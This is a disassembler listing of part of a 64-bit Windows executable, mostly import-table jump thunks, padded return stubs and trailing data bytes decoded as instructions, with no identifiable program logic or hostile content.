   14000ba00:	ff 25 ee 18 38 00    	jmp    *0x3818ee(%rip)        # 0x14038d2f4
   14000ba06:	90                   	nop
   14000ba07:	90                   	nop
   14000ba08:	ff 25 ee 18 38 00    	jmp    *0x3818ee(%rip)        # 0x14038d2fc
   14000ba0e:	90                   	nop
   14000ba0f:	90                   	nop
   14000ba10:	ff 25 ee 18 38 00    	jmp    *0x3818ee(%rip)        # 0x14038d304
   14000ba16:	90                   	nop
   14000ba17:	90                   	nop
   14000ba18:	ff 25 ee 18 38 00    	jmp    *0x3818ee(%rip)        # 0x14038d30c
   14000ba1e:	90                   	nop
   14000ba1f:	90                   	nop
   14000ba20:	ff 25 ee 18 38 00    	jmp    *0x3818ee(%rip)        # 0x14038d314
   14000ba26:	90                   	nop
   14000ba27:	90                   	nop
   14000ba28:	ff 25 ee 18 38 00    	jmp    *0x3818ee(%rip)        # 0x14038d31c
   14000ba2e:	90                   	nop
   14000ba2f:	90                   	nop
   14000ba30:	ff 25 ee 18 38 00    	jmp    *0x3818ee(%rip)        # 0x14038d324
   14000ba36:	90                   	nop
   14000ba37:	90                   	nop
   14000ba38:	ff 25 f6 18 38 00    	jmp    *0x3818f6(%rip)        # 0x14038d334
   14000ba3e:	90                   	nop
   14000ba3f:	90                   	nop
   14000ba40:	ff 25 f6 18 38 00    	jmp    *0x3818f6(%rip)        # 0x14038d33c
   14000ba46:	90                   	nop
   14000ba47:	90                   	nop
   14000ba48:	ff 25 f6 18 38 00    	jmp    *0x3818f6(%rip)        # 0x14038d344
   14000ba4e:	90                   	nop
   14000ba4f:	90                   	nop
   14000ba50:	ff 25 fe 18 38 00    	jmp    *0x3818fe(%rip)        # 0x14038d354
   14000ba56:	90                   	nop
   14000ba57:	90                   	nop
   14000ba58:	ff 25 06 19 38 00    	jmp    *0x381906(%rip)        # 0x14038d364
   14000ba5e:	90                   	nop
   14000ba5f:	90                   	nop
   14000ba60:	ff 25 06 19 38 00    	jmp    *0x381906(%rip)        # 0x14038d36c
   14000ba66:	90                   	nop
   14000ba67:	90                   	nop
   14000ba68:	ff 25 0e 19 38 00    	jmp    *0x38190e(%rip)        # 0x14038d37c
   14000ba6e:	90                   	nop
   14000ba6f:	90                   	nop
   14000ba70:	ff 25 0e 19 38 00    	jmp    *0x38190e(%rip)        # 0x14038d384
   14000ba76:	90                   	nop
   14000ba77:	90                   	nop
   14000ba78:	ff 25 0e 19 38 00    	jmp    *0x38190e(%rip)        # 0x14038d38c
   14000ba7e:	90                   	nop
   14000ba7f:	90                   	nop
   14000ba80:	ff 25 0e 19 38 00    	jmp    *0x38190e(%rip)        # 0x14038d394
   14000ba86:	90                   	nop
   14000ba87:	90                   	nop
   14000ba88:	ff 25 0e 19 38 00    	jmp    *0x38190e(%rip)        # 0x14038d39c
   14000ba8e:	90                   	nop
   14000ba8f:	90                   	nop
   14000ba90:	ff 25 0e 19 38 00    	jmp    *0x38190e(%rip)        # 0x14038d3a4
   14000ba96:	90                   	nop
   14000ba97:	90                   	nop
   14000ba98:	ff 25 0e 19 38 00    	jmp    *0x38190e(%rip)        # 0x14038d3ac
   14000ba9e:	90                   	nop
   14000ba9f:	90                   	nop
   14000baa0:	ff 25 0e 19 38 00    	jmp    *0x38190e(%rip)        # 0x14038d3b4
   14000baa6:	90                   	nop
   14000baa7:	90                   	nop
   14000baa8:	ff 25 0e 19 38 00    	jmp    *0x38190e(%rip)        # 0x14038d3bc
   14000baae:	90                   	nop
   14000baaf:	90                   	nop
   14000bab0:	ff 25 0e 19 38 00    	jmp    *0x38190e(%rip)        # 0x14038d3c4
   14000bab6:	90                   	nop
   14000bab7:	90                   	nop
   14000bab8:	ff 25 0e 19 38 00    	jmp    *0x38190e(%rip)        # 0x14038d3cc
   14000babe:	90                   	nop
   14000babf:	90                   	nop
   14000bac0:	ff 25 0e 19 38 00    	jmp    *0x38190e(%rip)        # 0x14038d3d4
   14000bac6:	90                   	nop
   14000bac7:	90                   	nop
   14000bac8:	ff 25 0e 19 38 00    	jmp    *0x38190e(%rip)        # 0x14038d3dc
   14000bace:	90                   	nop
   14000bacf:	90                   	nop
   14000bad0:	ff 25 0e 19 38 00    	jmp    *0x38190e(%rip)        # 0x14038d3e4
   14000bad6:	90                   	nop
   14000bad7:	90                   	nop
   14000bad8:	ff 25 0e 19 38 00    	jmp    *0x38190e(%rip)        # 0x14038d3ec
   14000bade:	90                   	nop
   14000badf:	90                   	nop
   14000bae0:	ff 25 0e 19 38 00    	jmp    *0x38190e(%rip)        # 0x14038d3f4
   14000bae6:	90                   	nop
   14000bae7:	90                   	nop
   14000bae8:	ff 25 0e 19 38 00    	jmp    *0x38190e(%rip)        # 0x14038d3fc
   14000baee:	90                   	nop
   14000baef:	90                   	nop
   14000baf0:	ff 25 0e 19 38 00    	jmp    *0x38190e(%rip)        # 0x14038d404
   14000baf6:	90                   	nop
   14000baf7:	90                   	nop
   14000baf8:	ff 25 0e 19 38 00    	jmp    *0x38190e(%rip)        # 0x14038d40c
   14000bafe:	90                   	nop
   14000baff:	90                   	nop
   14000bb00:	ff 25 0e 19 38 00    	jmp    *0x38190e(%rip)        # 0x14038d414
   14000bb06:	90                   	nop
   14000bb07:	90                   	nop
   14000bb08:	ff 25 0e 19 38 00    	jmp    *0x38190e(%rip)        # 0x14038d41c
   14000bb0e:	90                   	nop
   14000bb0f:	90                   	nop
   14000bb10:	ff 25 0e 19 38 00    	jmp    *0x38190e(%rip)        # 0x14038d424
   14000bb16:	90                   	nop
   14000bb17:	90                   	nop
   14000bb18:	ff 25 0e 19 38 00    	jmp    *0x38190e(%rip)        # 0x14038d42c
   14000bb1e:	90                   	nop
   14000bb1f:	90                   	nop
   14000bb20:	ff 25 0e 19 38 00    	jmp    *0x38190e(%rip)        # 0x14038d434
   14000bb26:	90                   	nop
   14000bb27:	90                   	nop
   14000bb28:	ff 25 0e 19 38 00    	jmp    *0x38190e(%rip)        # 0x14038d43c
   14000bb2e:	90                   	nop
   14000bb2f:	90                   	nop
   14000bb30:	ff 25 ae 17 38 00    	jmp    *0x3817ae(%rip)        # 0x14038d2e4
   14000bb36:	90                   	nop
   14000bb37:	90                   	nop
   14000bb38:	ff 25 9e 17 38 00    	jmp    *0x38179e(%rip)        # 0x14038d2dc
   14000bb3e:	90                   	nop
   14000bb3f:	90                   	nop
   14000bb40:	ff 25 8e 17 38 00    	jmp    *0x38178e(%rip)        # 0x14038d2d4
   14000bb46:	90                   	nop
   14000bb47:	90                   	nop
   14000bb48:	ff 25 7e 17 38 00    	jmp    *0x38177e(%rip)        # 0x14038d2cc
   14000bb4e:	90                   	nop
   14000bb4f:	90                   	nop
   14000bb50:	ff 25 6e 17 38 00    	jmp    *0x38176e(%rip)        # 0x14038d2c4
   14000bb56:	90                   	nop
   14000bb57:	90                   	nop
   14000bb58:	ff 25 5e 17 38 00    	jmp    *0x38175e(%rip)        # 0x14038d2bc
   14000bb5e:	90                   	nop
   14000bb5f:	90                   	nop
   14000bb60:	ff 25 4e 17 38 00    	jmp    *0x38174e(%rip)        # 0x14038d2b4
   14000bb66:	90                   	nop
   14000bb67:	90                   	nop
   14000bb68:	ff 25 3e 17 38 00    	jmp    *0x38173e(%rip)        # 0x14038d2ac
   14000bb6e:	90                   	nop
   14000bb6f:	90                   	nop
   14000bb70:	ff 25 2e 17 38 00    	jmp    *0x38172e(%rip)        # 0x14038d2a4
   14000bb76:	90                   	nop
   14000bb77:	90                   	nop
   14000bb78:	ff 25 1e 17 38 00    	jmp    *0x38171e(%rip)        # 0x14038d29c
   14000bb7e:	90                   	nop
   14000bb7f:	90                   	nop
   14000bb80:	ff 25 0e 17 38 00    	jmp    *0x38170e(%rip)        # 0x14038d294
   14000bb86:	90                   	nop
   14000bb87:	90                   	nop
   14000bb88:	ff 25 fe 16 38 00    	jmp    *0x3816fe(%rip)        # 0x14038d28c
   14000bb8e:	90                   	nop
   14000bb8f:	90                   	nop
   14000bb90:	ff 25 ee 16 38 00    	jmp    *0x3816ee(%rip)        # 0x14038d284
   14000bb96:	90                   	nop
   14000bb97:	90                   	nop
   14000bb98:	ff 25 de 16 38 00    	jmp    *0x3816de(%rip)        # 0x14038d27c
   14000bb9e:	90                   	nop
   14000bb9f:	90                   	nop
   14000bba0:	ff 25 ce 16 38 00    	jmp    *0x3816ce(%rip)        # 0x14038d274
   14000bba6:	90                   	nop
   14000bba7:	90                   	nop
   14000bba8:	ff 25 be 16 38 00    	jmp    *0x3816be(%rip)        # 0x14038d26c
   14000bbae:	90                   	nop
   14000bbaf:	90                   	nop
   14000bbb0:	ff 25 ae 16 38 00    	jmp    *0x3816ae(%rip)        # 0x14038d264
   14000bbb6:	90                   	nop
   14000bbb7:	90                   	nop
   14000bbb8:	ff 25 9e 16 38 00    	jmp    *0x38169e(%rip)        # 0x14038d25c
   14000bbbe:	90                   	nop
   14000bbbf:	90                   	nop
   14000bbc0:	ff 25 8e 16 38 00    	jmp    *0x38168e(%rip)        # 0x14038d254
   14000bbc6:	90                   	nop
   14000bbc7:	90                   	nop
   14000bbc8:	ff 25 7e 16 38 00    	jmp    *0x38167e(%rip)        # 0x14038d24c
   14000bbce:	90                   	nop
   14000bbcf:	90                   	nop
   14000bbd0:	ff 25 6e 16 38 00    	jmp    *0x38166e(%rip)        # 0x14038d244
   14000bbd6:	90                   	nop
   14000bbd7:	90                   	nop
   14000bbd8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000bbdf:	00 
   14000bbe0:	e9 6b a2 ff ff       	jmp    0x140005e50
   14000bbe5:	90                   	nop
   14000bbe6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000bbed:	00 00 00 
   14000bbf0:	48 85 d2             	test   %rdx,%rdx
   14000bbf3:	75 0b                	jne    0x14000bc00
   14000bbf5:	31 c0                	xor    %eax,%eax
   14000bbf7:	c3                   	ret
   14000bbf8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000bbff:	00 
   14000bc00:	e9 cb a1 ff ff       	jmp    0x140005dd0
   14000bc05:	90                   	nop
   14000bc06:	90                   	nop
   14000bc07:	90                   	nop
   14000bc08:	90                   	nop
   14000bc09:	90                   	nop
   14000bc0a:	90                   	nop
   14000bc0b:	90                   	nop
   14000bc0c:	90                   	nop
   14000bc0d:	90                   	nop
   14000bc0e:	90                   	nop
   14000bc0f:	90                   	nop
   14000bc10:	c3                   	ret
   14000bc11:	90                   	nop
   14000bc12:	90                   	nop
   14000bc13:	90                   	nop
   14000bc14:	90                   	nop
   14000bc15:	90                   	nop
   14000bc16:	90                   	nop
   14000bc17:	90                   	nop
   14000bc18:	90                   	nop
   14000bc19:	90                   	nop
   14000bc1a:	90                   	nop
   14000bc1b:	90                   	nop
   14000bc1c:	90                   	nop
   14000bc1d:	90                   	nop
   14000bc1e:	90                   	nop
   14000bc1f:	90                   	nop
   14000bc20:	c3                   	ret
   14000bc21:	90                   	nop
   14000bc22:	90                   	nop
   14000bc23:	90                   	nop
   14000bc24:	90                   	nop
   14000bc25:	90                   	nop
   14000bc26:	90                   	nop
   14000bc27:	90                   	nop
   14000bc28:	90                   	nop
   14000bc29:	90                   	nop
   14000bc2a:	90                   	nop
   14000bc2b:	90                   	nop
   14000bc2c:	90                   	nop
   14000bc2d:	90                   	nop
   14000bc2e:	90                   	nop
   14000bc2f:	90                   	nop
   14000bc30:	c3                   	ret
   14000bc31:	90                   	nop
   14000bc32:	90                   	nop
   14000bc33:	90                   	nop
   14000bc34:	90                   	nop
   14000bc35:	90                   	nop
   14000bc36:	90                   	nop
   14000bc37:	90                   	nop
   14000bc38:	90                   	nop
   14000bc39:	90                   	nop
   14000bc3a:	90                   	nop
   14000bc3b:	90                   	nop
   14000bc3c:	90                   	nop
   14000bc3d:	90                   	nop
   14000bc3e:	90                   	nop
   14000bc3f:	90                   	nop
   14000bc40:	c3                   	ret
   14000bc41:	90                   	nop
   14000bc42:	90                   	nop
   14000bc43:	90                   	nop
   14000bc44:	90                   	nop
   14000bc45:	90                   	nop
   14000bc46:	90                   	nop
   14000bc47:	90                   	nop
   14000bc48:	90                   	nop
   14000bc49:	90                   	nop
   14000bc4a:	90                   	nop
   14000bc4b:	90                   	nop
   14000bc4c:	90                   	nop
   14000bc4d:	90                   	nop
   14000bc4e:	90                   	nop
   14000bc4f:	90                   	nop
   14000bc50:	c3                   	ret
   14000bc51:	90                   	nop
   14000bc52:	90                   	nop
   14000bc53:	90                   	nop
   14000bc54:	90                   	nop
   14000bc55:	90                   	nop
   14000bc56:	90                   	nop
   14000bc57:	90                   	nop
   14000bc58:	90                   	nop
   14000bc59:	90                   	nop
   14000bc5a:	90                   	nop
   14000bc5b:	90                   	nop
   14000bc5c:	90                   	nop
   14000bc5d:	90                   	nop
   14000bc5e:	90                   	nop
   14000bc5f:	90                   	nop
   14000bc60:	c3                   	ret
   14000bc61:	90                   	nop
   14000bc62:	90                   	nop
   14000bc63:	90                   	nop
   14000bc64:	90                   	nop
   14000bc65:	90                   	nop
   14000bc66:	90                   	nop
   14000bc67:	90                   	nop
   14000bc68:	90                   	nop
   14000bc69:	90                   	nop
   14000bc6a:	90                   	nop
   14000bc6b:	90                   	nop
   14000bc6c:	90                   	nop
   14000bc6d:	90                   	nop
   14000bc6e:	90                   	nop
   14000bc6f:	90                   	nop
   14000bc70:	c3                   	ret
   14000bc71:	90                   	nop
   14000bc72:	90                   	nop
   14000bc73:	90                   	nop
   14000bc74:	90                   	nop
   14000bc75:	90                   	nop
   14000bc76:	90                   	nop
   14000bc77:	90                   	nop
   14000bc78:	90                   	nop
   14000bc79:	90                   	nop
   14000bc7a:	90                   	nop
   14000bc7b:	90                   	nop
   14000bc7c:	90                   	nop
   14000bc7d:	90                   	nop
   14000bc7e:	90                   	nop
   14000bc7f:	90                   	nop
   14000bc80:	c3                   	ret
   14000bc81:	90                   	nop
   14000bc82:	90                   	nop
   14000bc83:	90                   	nop
   14000bc84:	90                   	nop
   14000bc85:	90                   	nop
   14000bc86:	90                   	nop
   14000bc87:	90                   	nop
   14000bc88:	90                   	nop
   14000bc89:	90                   	nop
   14000bc8a:	90                   	nop
   14000bc8b:	90                   	nop
   14000bc8c:	90                   	nop
   14000bc8d:	90                   	nop
   14000bc8e:	90                   	nop
   14000bc8f:	90                   	nop
   14000bc90:	c3                   	ret
   14000bc91:	90                   	nop
   14000bc92:	90                   	nop
   14000bc93:	90                   	nop
   14000bc94:	90                   	nop
   14000bc95:	90                   	nop
   14000bc96:	90                   	nop
   14000bc97:	90                   	nop
   14000bc98:	90                   	nop
   14000bc99:	90                   	nop
   14000bc9a:	90                   	nop
   14000bc9b:	90                   	nop
   14000bc9c:	90                   	nop
   14000bc9d:	90                   	nop
   14000bc9e:	90                   	nop
   14000bc9f:	90                   	nop
   14000bca0:	c3                   	ret
   14000bca1:	90                   	nop
   14000bca2:	90                   	nop
   14000bca3:	90                   	nop
   14000bca4:	90                   	nop
   14000bca5:	90                   	nop
   14000bca6:	90                   	nop
   14000bca7:	90                   	nop
   14000bca8:	90                   	nop
   14000bca9:	90                   	nop
   14000bcaa:	90                   	nop
   14000bcab:	90                   	nop
   14000bcac:	90                   	nop
   14000bcad:	90                   	nop
   14000bcae:	90                   	nop
   14000bcaf:	90                   	nop
   14000bcb0:	c3                   	ret
   14000bcb1:	90                   	nop
   14000bcb2:	90                   	nop
   14000bcb3:	90                   	nop
   14000bcb4:	90                   	nop
   14000bcb5:	90                   	nop
   14000bcb6:	90                   	nop
   14000bcb7:	90                   	nop
   14000bcb8:	90                   	nop
   14000bcb9:	90                   	nop
   14000bcba:	90                   	nop
   14000bcbb:	90                   	nop
   14000bcbc:	90                   	nop
   14000bcbd:	90                   	nop
   14000bcbe:	90                   	nop
   14000bcbf:	90                   	nop
   14000bcc0:	c3                   	ret
   14000bcc1:	90                   	nop
   14000bcc2:	90                   	nop
   14000bcc3:	90                   	nop
   14000bcc4:	90                   	nop
   14000bcc5:	90                   	nop
   14000bcc6:	90                   	nop
   14000bcc7:	90                   	nop
   14000bcc8:	90                   	nop
   14000bcc9:	90                   	nop
   14000bcca:	90                   	nop
   14000bccb:	90                   	nop
   14000bccc:	90                   	nop
   14000bccd:	90                   	nop
   14000bcce:	90                   	nop
   14000bccf:	90                   	nop
   14000bcd0:	c3                   	ret
   14000bcd1:	90                   	nop
   14000bcd2:	90                   	nop
   14000bcd3:	90                   	nop
   14000bcd4:	90                   	nop
   14000bcd5:	90                   	nop
   14000bcd6:	90                   	nop
   14000bcd7:	90                   	nop
   14000bcd8:	90                   	nop
   14000bcd9:	90                   	nop
   14000bcda:	90                   	nop
   14000bcdb:	90                   	nop
   14000bcdc:	90                   	nop
   14000bcdd:	90                   	nop
   14000bcde:	90                   	nop
   14000bcdf:	90                   	nop
   14000bce0:	c3                   	ret
   14000bce1:	90                   	nop
   14000bce2:	90                   	nop
   14000bce3:	90                   	nop
   14000bce4:	90                   	nop
   14000bce5:	90                   	nop
   14000bce6:	90                   	nop
   14000bce7:	90                   	nop
   14000bce8:	90                   	nop
   14000bce9:	90                   	nop
   14000bcea:	90                   	nop
   14000bceb:	90                   	nop
   14000bcec:	90                   	nop
   14000bced:	90                   	nop
   14000bcee:	90                   	nop
   14000bcef:	90                   	nop
   14000bcf0:	c3                   	ret
   14000bcf1:	90                   	nop
   14000bcf2:	90                   	nop
   14000bcf3:	90                   	nop
   14000bcf4:	90                   	nop
   14000bcf5:	90                   	nop
   14000bcf6:	90                   	nop
   14000bcf7:	90                   	nop
   14000bcf8:	90                   	nop
   14000bcf9:	90                   	nop
   14000bcfa:	90                   	nop
   14000bcfb:	90                   	nop
   14000bcfc:	90                   	nop
   14000bcfd:	90                   	nop
   14000bcfe:	90                   	nop
   14000bcff:	90                   	nop
   14000bd00:	c3                   	ret
   14000bd01:	90                   	nop
   14000bd02:	90                   	nop
   14000bd03:	90                   	nop
   14000bd04:	90                   	nop
   14000bd05:	90                   	nop
   14000bd06:	90                   	nop
   14000bd07:	90                   	nop
   14000bd08:	90                   	nop
   14000bd09:	90                   	nop
   14000bd0a:	90                   	nop
   14000bd0b:	90                   	nop
   14000bd0c:	90                   	nop
   14000bd0d:	90                   	nop
   14000bd0e:	90                   	nop
   14000bd0f:	90                   	nop
   14000bd10:	c3                   	ret
   14000bd11:	90                   	nop
   14000bd12:	90                   	nop
   14000bd13:	90                   	nop
   14000bd14:	90                   	nop
   14000bd15:	90                   	nop
   14000bd16:	90                   	nop
   14000bd17:	90                   	nop
   14000bd18:	90                   	nop
   14000bd19:	90                   	nop
   14000bd1a:	90                   	nop
   14000bd1b:	90                   	nop
   14000bd1c:	90                   	nop
   14000bd1d:	90                   	nop
   14000bd1e:	90                   	nop
   14000bd1f:	90                   	nop
   14000bd20:	c3                   	ret
   14000bd21:	90                   	nop
   14000bd22:	90                   	nop
   14000bd23:	90                   	nop
   14000bd24:	90                   	nop
   14000bd25:	90                   	nop
   14000bd26:	90                   	nop
   14000bd27:	90                   	nop
   14000bd28:	90                   	nop
   14000bd29:	90                   	nop
   14000bd2a:	90                   	nop
   14000bd2b:	90                   	nop
   14000bd2c:	90                   	nop
   14000bd2d:	90                   	nop
   14000bd2e:	90                   	nop
   14000bd2f:	90                   	nop
   14000bd30:	c3                   	ret
   14000bd31:	90                   	nop
   14000bd32:	90                   	nop
   14000bd33:	90                   	nop
   14000bd34:	90                   	nop
   14000bd35:	90                   	nop
   14000bd36:	90                   	nop
   14000bd37:	90                   	nop
   14000bd38:	90                   	nop
   14000bd39:	90                   	nop
   14000bd3a:	90                   	nop
   14000bd3b:	90                   	nop
   14000bd3c:	90                   	nop
   14000bd3d:	90                   	nop
   14000bd3e:	90                   	nop
   14000bd3f:	90                   	nop
   14000bd40:	c3                   	ret
   14000bd41:	90                   	nop
   14000bd42:	90                   	nop
   14000bd43:	90                   	nop
   14000bd44:	90                   	nop
   14000bd45:	90                   	nop
   14000bd46:	90                   	nop
   14000bd47:	90                   	nop
   14000bd48:	90                   	nop
   14000bd49:	90                   	nop
   14000bd4a:	90                   	nop
   14000bd4b:	90                   	nop
   14000bd4c:	90                   	nop
   14000bd4d:	90                   	nop
   14000bd4e:	90                   	nop
   14000bd4f:	90                   	nop
   14000bd50:	c3                   	ret
   14000bd51:	90                   	nop
   14000bd52:	90                   	nop
   14000bd53:	90                   	nop
   14000bd54:	90                   	nop
   14000bd55:	90                   	nop
   14000bd56:	90                   	nop
   14000bd57:	90                   	nop
   14000bd58:	90                   	nop
   14000bd59:	90                   	nop
   14000bd5a:	90                   	nop
   14000bd5b:	90                   	nop
   14000bd5c:	90                   	nop
   14000bd5d:	90                   	nop
   14000bd5e:	90                   	nop
   14000bd5f:	90                   	nop
   14000bd60:	c3                   	ret
   14000bd61:	90                   	nop
   14000bd62:	90                   	nop
   14000bd63:	90                   	nop
   14000bd64:	90                   	nop
   14000bd65:	90                   	nop
   14000bd66:	90                   	nop
   14000bd67:	90                   	nop
   14000bd68:	90                   	nop
   14000bd69:	90                   	nop
   14000bd6a:	90                   	nop
   14000bd6b:	90                   	nop
   14000bd6c:	90                   	nop
   14000bd6d:	90                   	nop
   14000bd6e:	90                   	nop
   14000bd6f:	90                   	nop
   14000bd70:	c3                   	ret
   14000bd71:	90                   	nop
   14000bd72:	90                   	nop
   14000bd73:	90                   	nop
   14000bd74:	90                   	nop
   14000bd75:	90                   	nop
   14000bd76:	90                   	nop
   14000bd77:	90                   	nop
   14000bd78:	90                   	nop
   14000bd79:	90                   	nop
   14000bd7a:	90                   	nop
   14000bd7b:	90                   	nop
   14000bd7c:	90                   	nop
   14000bd7d:	90                   	nop
   14000bd7e:	90                   	nop
   14000bd7f:	90                   	nop
   14000bd80:	c3                   	ret
   14000bd81:	90                   	nop
   14000bd82:	90                   	nop
   14000bd83:	90                   	nop
   14000bd84:	90                   	nop
   14000bd85:	90                   	nop
   14000bd86:	90                   	nop
   14000bd87:	90                   	nop
   14000bd88:	90                   	nop
   14000bd89:	90                   	nop
   14000bd8a:	90                   	nop
   14000bd8b:	90                   	nop
   14000bd8c:	90                   	nop
   14000bd8d:	90                   	nop
   14000bd8e:	90                   	nop
   14000bd8f:	90                   	nop
   14000bd90:	c3                   	ret
   14000bd91:	90                   	nop
   14000bd92:	90                   	nop
   14000bd93:	90                   	nop
   14000bd94:	90                   	nop
   14000bd95:	90                   	nop
   14000bd96:	90                   	nop
   14000bd97:	90                   	nop
   14000bd98:	90                   	nop
   14000bd99:	90                   	nop
   14000bd9a:	90                   	nop
   14000bd9b:	90                   	nop
   14000bd9c:	90                   	nop
   14000bd9d:	90                   	nop
   14000bd9e:	90                   	nop
   14000bd9f:	90                   	nop
   14000bda0:	c3                   	ret
   14000bda1:	90                   	nop
   14000bda2:	90                   	nop
   14000bda3:	90                   	nop
   14000bda4:	90                   	nop
   14000bda5:	90                   	nop
   14000bda6:	90                   	nop
   14000bda7:	90                   	nop
   14000bda8:	90                   	nop
   14000bda9:	90                   	nop
   14000bdaa:	90                   	nop
   14000bdab:	90                   	nop
   14000bdac:	90                   	nop
   14000bdad:	90                   	nop
   14000bdae:	90                   	nop
   14000bdaf:	90                   	nop
   14000bdb0:	c3                   	ret
   14000bdb1:	90                   	nop
   14000bdb2:	90                   	nop
   14000bdb3:	90                   	nop
   14000bdb4:	90                   	nop
   14000bdb5:	90                   	nop
   14000bdb6:	90                   	nop
   14000bdb7:	90                   	nop
   14000bdb8:	90                   	nop
   14000bdb9:	90                   	nop
   14000bdba:	90                   	nop
   14000bdbb:	90                   	nop
   14000bdbc:	90                   	nop
   14000bdbd:	90                   	nop
   14000bdbe:	90                   	nop
   14000bdbf:	90                   	nop
   14000bdc0:	c3                   	ret
   14000bdc1:	90                   	nop
   14000bdc2:	90                   	nop
   14000bdc3:	90                   	nop
   14000bdc4:	90                   	nop
   14000bdc5:	90                   	nop
   14000bdc6:	90                   	nop
   14000bdc7:	90                   	nop
   14000bdc8:	90                   	nop
   14000bdc9:	90                   	nop
   14000bdca:	90                   	nop
   14000bdcb:	90                   	nop
   14000bdcc:	90                   	nop
   14000bdcd:	90                   	nop
   14000bdce:	90                   	nop
   14000bdcf:	90                   	nop
   14000bdd0:	c3                   	ret
   14000bdd1:	90                   	nop
   14000bdd2:	90                   	nop
   14000bdd3:	90                   	nop
   14000bdd4:	90                   	nop
   14000bdd5:	90                   	nop
   14000bdd6:	90                   	nop
   14000bdd7:	90                   	nop
   14000bdd8:	90                   	nop
   14000bdd9:	90                   	nop
   14000bdda:	90                   	nop
   14000bddb:	90                   	nop
   14000bddc:	90                   	nop
   14000bddd:	90                   	nop
   14000bdde:	90                   	nop
   14000bddf:	90                   	nop
   14000bde0:	c3                   	ret
   14000bde1:	90                   	nop
   14000bde2:	90                   	nop
   14000bde3:	90                   	nop
   14000bde4:	90                   	nop
   14000bde5:	90                   	nop
   14000bde6:	90                   	nop
   14000bde7:	90                   	nop
   14000bde8:	90                   	nop
   14000bde9:	90                   	nop
   14000bdea:	90                   	nop
   14000bdeb:	90                   	nop
   14000bdec:	90                   	nop
   14000bded:	90                   	nop
   14000bdee:	90                   	nop
   14000bdef:	90                   	nop
   14000bdf0:	c3                   	ret
   14000bdf1:	90                   	nop
   14000bdf2:	90                   	nop
   14000bdf3:	90                   	nop
   14000bdf4:	90                   	nop
   14000bdf5:	90                   	nop
   14000bdf6:	90                   	nop
   14000bdf7:	90                   	nop
   14000bdf8:	90                   	nop
   14000bdf9:	90                   	nop
   14000bdfa:	90                   	nop
   14000bdfb:	90                   	nop
   14000bdfc:	90                   	nop
   14000bdfd:	90                   	nop
   14000bdfe:	90                   	nop
   14000bdff:	90                   	nop
   14000be00:	c3                   	ret
   14000be01:	90                   	nop
   14000be02:	90                   	nop
   14000be03:	90                   	nop
   14000be04:	90                   	nop
   14000be05:	90                   	nop
   14000be06:	90                   	nop
   14000be07:	90                   	nop
   14000be08:	90                   	nop
   14000be09:	90                   	nop
   14000be0a:	90                   	nop
   14000be0b:	90                   	nop
   14000be0c:	90                   	nop
   14000be0d:	90                   	nop
   14000be0e:	90                   	nop
   14000be0f:	90                   	nop
   14000be10:	c3                   	ret
   14000be11:	90                   	nop
   14000be12:	90                   	nop
   14000be13:	90                   	nop
   14000be14:	90                   	nop
   14000be15:	90                   	nop
   14000be16:	90                   	nop
   14000be17:	90                   	nop
   14000be18:	90                   	nop
   14000be19:	90                   	nop
   14000be1a:	90                   	nop
   14000be1b:	90                   	nop
   14000be1c:	90                   	nop
   14000be1d:	90                   	nop
   14000be1e:	90                   	nop
   14000be1f:	90                   	nop
   14000be20:	c3                   	ret
   14000be21:	90                   	nop
   14000be22:	90                   	nop
   14000be23:	90                   	nop
   14000be24:	90                   	nop
   14000be25:	90                   	nop
   14000be26:	90                   	nop
   14000be27:	90                   	nop
   14000be28:	90                   	nop
   14000be29:	90                   	nop
   14000be2a:	90                   	nop
   14000be2b:	90                   	nop
   14000be2c:	90                   	nop
   14000be2d:	90                   	nop
   14000be2e:	90                   	nop
   14000be2f:	90                   	nop
   14000be30:	c3                   	ret
   14000be31:	90                   	nop
   14000be32:	90                   	nop
   14000be33:	90                   	nop
   14000be34:	90                   	nop
   14000be35:	90                   	nop
   14000be36:	90                   	nop
   14000be37:	90                   	nop
   14000be38:	90                   	nop
   14000be39:	90                   	nop
   14000be3a:	90                   	nop
   14000be3b:	90                   	nop
   14000be3c:	90                   	nop
   14000be3d:	90                   	nop
   14000be3e:	90                   	nop
   14000be3f:	90                   	nop
   14000be40:	c3                   	ret
   14000be41:	90                   	nop
   14000be42:	90                   	nop
   14000be43:	90                   	nop
   14000be44:	90                   	nop
   14000be45:	90                   	nop
   14000be46:	90                   	nop
   14000be47:	90                   	nop
   14000be48:	90                   	nop
   14000be49:	90                   	nop
   14000be4a:	90                   	nop
   14000be4b:	90                   	nop
   14000be4c:	90                   	nop
   14000be4d:	90                   	nop
   14000be4e:	90                   	nop
   14000be4f:	90                   	nop
   14000be50:	e9 eb 56 ff ff       	jmp    0x140001540
   14000be55:	90                   	nop
   14000be56:	90                   	nop
   14000be57:	90                   	nop
   14000be58:	90                   	nop
   14000be59:	90                   	nop
   14000be5a:	90                   	nop
   14000be5b:	90                   	nop
   14000be5c:	90                   	nop
   14000be5d:	90                   	nop
   14000be5e:	90                   	nop
   14000be5f:	90                   	nop
   14000be60:	ff                   	(bad)
   14000be61:	ff                   	(bad)
   14000be62:	ff                   	(bad)
   14000be63:	ff                   	(bad)
   14000be64:	ff                   	(bad)
   14000be65:	ff                   	(bad)
   14000be66:	ff                   	(bad)
   14000be67:	ff 50 be             	call   *-0x42(%rax)
   14000be6a:	00 40 01             	add    %al,0x1(%rax)
	...
   14000be75:	00 00                	add    %al,(%rax)
   14000be77:	00 ff                	add    %bh,%bh
   14000be79:	ff                   	(bad)
   14000be7a:	ff                   	(bad)
   14000be7b:	ff                   	(bad)
   14000be7c:	ff                   	(bad)
   14000be7d:	ff                   	(bad)
   14000be7e:	ff                   	(bad)
   14000be7f:	ff 00                	incl   (%rax)
   14000be81:	00 00                	add    %al,(%rax)
   14000be83:	00 00                	add    %al,(%rax)
   14000be85:	00 00                	add    %al,(%rax)
	...
